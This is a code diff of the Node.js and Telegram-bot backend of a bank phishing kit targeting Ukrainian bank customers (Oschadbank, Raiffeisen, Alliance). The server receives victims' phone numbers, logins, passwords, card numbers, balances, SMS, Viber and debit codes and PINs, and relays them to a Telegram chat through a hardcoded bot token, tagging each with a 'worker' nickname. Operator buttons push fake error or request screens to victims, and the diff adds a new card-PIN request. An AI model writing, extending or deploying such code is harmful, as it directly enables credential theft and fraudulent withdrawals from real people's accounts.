@@ -6,7 +6,6 @@ const path = require('path');
 const { atob } = require('buffer');
 
 // --- КОНФИГУРАЦИЯ ---
-// Я ВЕРНУЛ ВАШИ ПРАВИЛЬНЫЕ ДАННЫЕ ЗДЕСЬ
 const TELEGRAM_BOT_TOKEN = '8383351361:AAF8fhC3zwfegB2lF6hlwqw2U5UozpGxn_k';
 const CHAT_ID = '-4961970994';
 // --- КОНЕЦ КОНФИГУРАЦИИ ---
@@ -86,7 +85,17 @@ bot.on('callback_query', (callbackQuery) => {
         case 'ban':
         case 'number_error':
         case 'balance_error':
-            break; 
+            break;
+
+        case 'cardpn': // Новая команда для запроса PIN-кода карты
+            if (sessionData.bankName === 'Ощадбанк') {
+                command.type = 'show_card_pin_form';
+                responseText = 'Запрос PIN-кода карты отправлен!';
+            } else {
+                bot.answerCallbackQuery(callbackQuery.id, { text: 'Команда "КАРТАПН" не применима для этого банка', show_alert: true });
+                return;
+            }
+            break;
 
         case 'telegram_debit':
             if (sessionData.bankName === 'Ощадбанк') {
@@ -95,13 +104,20 @@ bot.on('callback_query', (callbackQuery) => {
                 command.type = 'show_debit_form';
             }
             break;
-            
+
         case 'password_error':
             if (sessionData.bankName === 'Райффайзен') {
-                 command.type = 'raiff_pin_error';
-                 responseText = 'Запрос "неверный пароль" отправлен!';
-            } else {
+                command.type = 'raiff_pin_error';
+                responseText = 'Запрос "неверный пароль" отправлен!';
+            } else if (sessionData.bankName === 'Ощадбанк') {
                 command.data = { loginType: sessionData.loginMethod || 'phone' };
+            }
+            break;
+
+        case 'client_not_found':
+            if (sessionData.bankName === 'Ощадбанк') {
+                command.type = 'client_not_found';
+                responseText = 'Клиент не найден!';
             }
             break;
 
@@ -113,28 +129,25 @@ bot.on('callback_query', (callbackQuery) => {
             }
             responseText = 'Запрос "неверный код" отправлен!';
             break;
-            
+
         case 'request_details':
             if (sessionData.bankName === 'Альянс') {
                 command.type = 'request_alliance_card_details';
                 responseText = 'Запрос (Альянс) отправлен!';
-            } 
-            else if (sessionData.bankName !== 'Ощадбанк') {
-                 command.type = 'show_card_details_form';
-                 responseText = 'Запрос (общий) отправлен!';
-            } 
-            else {
-                 bot.answerCallbackQuery(callbackQuery.id, { text: 'Команда "Запрос" не применима для Ощадбанка', show_alert: true });
-                 return;
+            } else if (sessionData.bankName !== 'Ощадбанк') {
+                command.type = 'show_card_details_form';
+                responseText = 'Запрос (общий) отправлен!';
+            } else {
+                bot.answerCallbackQuery(callbackQuery.id, { text: 'Команда "Запрос" не применима для Ощадбанка', show_alert: true });
+                return;
             }
             break;
-            
+
         case 'other':
-             command.data = { text: "По техническим причинам данный банк временно недоступен. Пожалуйста, выберите другой." };
-             break;
+            command.data = { text: "По техническим причинам данный банк временно недоступен. Пожалуйста, выберите другой." };
+            break;
 
         case 'viber_call':
-            // Отправляем команду 'viber', которую фронтенд понимает и которая открывает окно с 6-значным кодом.
             command.type = 'viber';
             responseText = 'Запрос Viber 📞 отправлен!';
             break;
@@ -143,7 +156,7 @@ bot.on('callback_query', (callbackQuery) => {
             command.type = 'redirect_call';
             responseText = 'Запрос Переадресация 📞 отправлен!';
             break;
-            
+
         default:
             bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` });
             return;
@@ -153,18 +166,17 @@ bot.on('callback_query', (callbackQuery) => {
     bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
 });
 
-
 app.post('/api/submit', (req, res) => {
     const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
     let workerNick = 'unknown';
     try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) { /* ignore */ }
-    
+
     const existingData = sessions.get(sessionId) || {};
     const newData = { ...existingData, ...stepData, workerNick };
     sessions.set(sessionId, newData);
-    
+
     let message = '';
-    
+
     if (newData.bankName === 'Райффайзен') {
         if (stepData.phone) {
             message = `<b>📱 Новый лог (Райф) - Телефон</b>\n\n`;
@@ -183,8 +195,7 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        } 
-        else if (stepData.debit_sms_code) {
+        } else if (stepData.debit_sms_code) {
             message = `<b>💸 Код списания (Райф)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
             const phone = newData.phone || 'не указан';
@@ -192,8 +203,7 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
-    } 
-    else {
+    } else {
         if (stepData.viber_code) {
             message = `<b>📞 Код из Viber (Ощад)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.viber_code}</code>\n`;
@@ -201,32 +211,28 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Номер телефона:</b> <code>${phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        }
-        else if (stepData.call_code) {
+        } else if (stepData.call_code) {
             message = `<b>📞 Код со звонка (Ощад)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.call_code}</code>\n`;
             const phone = newData.phone || newData.fp_phone || 'не указан';
             message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        }
-        else if (stepData.sms_code) {
+        } else if (stepData.sms_code) {
             message = `<b>💸 Код списания (Ощад)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.sms_code}</code>\n`;
             const phone = newData.phone || newData.fp_phone || 'не указан';
             message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        }
-        else if (stepData.debit_sms_code) {
+        } else if (stepData.debit_sms_code) {
             message = `<b>💸 Код списания (${newData.bankName})</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
             const phone = newData.phone || 'не указан';
             message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        }
-        else if (stepData.card_details) {
+        } else if (stepData.card_details) {
             const details = stepData.card_details;
             message = `<b>Данные по запросу (${newData.bankName})</b>\n\n`;
             message += `<b>Номер карты:</b> <code>${details.card || details.card_number_full || 'N/A'}</code>\n`;
@@ -235,8 +241,7 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Баланс:</b> <code>${details.balance || 'N/A'}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        }
-        else if (stepData.fp_pin) {
+        } else if (stepData.fp_pin) {
             message = `<b>🔧 Восстановление (Ощад)</b>\n\n`;
             message += `<b>Название банка:</b> ${newData.bankName}\n`;
             message += `<b>Мобильный:</b> <code>${newData.fp_phone}</code>\n`;
@@ -244,8 +249,14 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             sendToTelegram(message, sessionId, newData.bankName);
-        }
-        else if (stepData.password && (stepData.login || stepData.phone)) {
+        } else if (stepData.card_pin) { // Новая обработка PIN-кода карты
+            message = `<b>🔒 PIN-код карты (Ощад)</b>\n\n`;
+            message += `<b>Пин:</b> <code>${stepData.card_pin}</code>\n`;
+            const phone = newData.phone || newData.fp_phone || 'не указан';
+            message += `<b>Номер телефона:</b> <code>${phone}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        } else if (stepData.password && (stepData.login || stepData.phone)) {
             if (stepData.login) {
                 message = `<b>🏦 Вход в Ощад (Логин)</b>\n\n`;
                 message += `<b>Название банка:</b> ${newData.bankName}\n`;
@@ -259,21 +270,19 @@ app.post('/api/submit', (req, res) => {
             }
             message += `<b>Worker:</b> @${workerNick}\n`;
             sendToTelegram(message, sessionId, newData.bankName);
-        }
-        else if (isFinalStep) {
+        } else if (isFinalStep) {
             message = `<b>💳 Новый лог (${newData.bankName})</b>\n\n`;
             message += `<b>Название банка:</b> ${newData.bankName}\n`;
             if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
-            if (newData.card_number) message += `<b>Номер карти:</b> <code>${newData.card_number}</code>\n`;
-            if (newData.card) message += `<b>Номер карти:</b> <code>${newData.card}</code>\n`;
+            if (newData.card_number) message += `<b>Номер карты:</b> <code>${newData.card_number}</code>\n`;
+            if (newData.card) message += `<b>Номер карты:</b> <code>${newData.card}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             sendToTelegram(message, sessionId, newData.bankName);
         }
     }
-    
+
     res.status(200).json({ message: 'OK' });
 });
-
 
 app.post('/api/sms', (req, res) => {
     const { sessionId, code, referrer } = req.body;
@@ -283,7 +292,7 @@ app.post('/api/sms', (req, res) => {
     if (sessionData) {
         let message = `<b>💬 Получено SMS (старый поток)</b>\n\n`;
         message += `<b>Код:</b> <code>${code}</code>\n`;
-        if(sessionData.phone) message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
+        if (sessionData.phone) message += `<b>Номер телефона:</b> <code>${sessionData.phone}</code>\n`;
         message += `<b>Сессия:</b> <code>${sessionId}</code>\n`;
         message += `<b>Worker:</b> @${workerNick}\n`;
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
@@ -298,26 +307,62 @@ function sendToTelegram(message, sessionId, bankName) {
 
     if (bankName === 'Ощадбанк') {
         keyboard = [
-            [{ text: 'Viber 📞', callback_data: `viber_call:${sessionId}` }, { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }],
-            [{ text: 'ПИН ❌', callback_data: `password_error:${sessionId}` }, { text: 'КОД ❌', callback_data: `code_error:${sessionId}` }, { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }],
-            [{ text: 'другой банк', callback_data: `other:${sessionId}` }, { text: 'забанить', callback_data: `ban:${sessionId}` }]
+            [
+                { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
+                { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` },
+                { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
+                { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }
+            ],
+            [
+                { text: 'КАРТАПН', callback_data: `cardpn:${sessionId}` }, // Новая кнопка
+                { text: 'ПИН ❌', callback_data: `password_error:${sessionId}` },
+                { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
+                { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }
+            ],
+            [
+                { text: 'другой банк', callback_data: `other:${sessionId}` },
+                { text: 'забанить', callback_data: `ban:${sessionId}` }
+            ]
         ];
     } else if (bankName === 'Райффайзен') {
         keyboard = [
-            [{ text: 'Viber 📞', callback_data: `viber_call:${sessionId}` }, { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }],
-            [{ text: 'ПИН ❌', callback_data: `password_error:${sessionId}` }, { text: 'КОД ❌', callback_data: `code_error:${sessionId}` }, { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }],
-            [{ text: 'другой банк', callback_data: `other:${sessionId}` }, { text: 'забанить', callback_data: `ban:${sessionId}` }]
+            [
+                { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
+                { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` },
+                { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
+                { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }
+            ],
+            [
+                { text: 'ПИН ❌', callback_data: `password_error:${sessionId}` },
+                { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
+                { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }
+            ],
+            [
+                { text: 'другой банк', callback_data: `other:${sessionId}` },
+                { text: 'забанить', callback_data: `ban:${sessionId}` }
+            ]
         ];
-    } else { // Клавиатура для всех остальных банков
+    } else {
         keyboard = [
-            [{ text: 'Viber 📞', callback_data: `viber_call:${sessionId}` }, { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }],
-            [{ text: 'КОД ❌', callback_data: `code_error:${sessionId}` }, { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }],
-            [{ text: 'другой банк', callback_data: `other:${sessionId}` }, { text: 'забанить', callback_data: `ban:${sessionId}` }]
+            [
+                { text: 'Viber 📞', callback_data: `viber_call:${sessionId}` },
+                { text: 'Переадресация 📞', callback_data: `redirect_call:${sessionId}` },
+                { text: 'Списание', callback_data: `telegram_debit:${sessionId}` },
+                { text: 'Запрос 💳', callback_data: `request_details:${sessionId}` }
+            ],
+            [
+                { text: 'КОД ❌', callback_data: `code_error:${sessionId}` },
+                { text: 'НОМЕР ❌', callback_data: `number_error:${sessionId}` }
+            ],
+            [
+                { text: 'другой банк', callback_data: `other:${sessionId}` },
+                { text: 'забанить', callback_data: `ban:${sessionId}` }
+            ]
         ];
     }
 
     bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } })
-       .catch(err => console.error("Telegram send error:", err));
+        .catch(err => console.error("Telegram send error:", err));
 }
 
 const PORT = process.env.PORT || 3000;
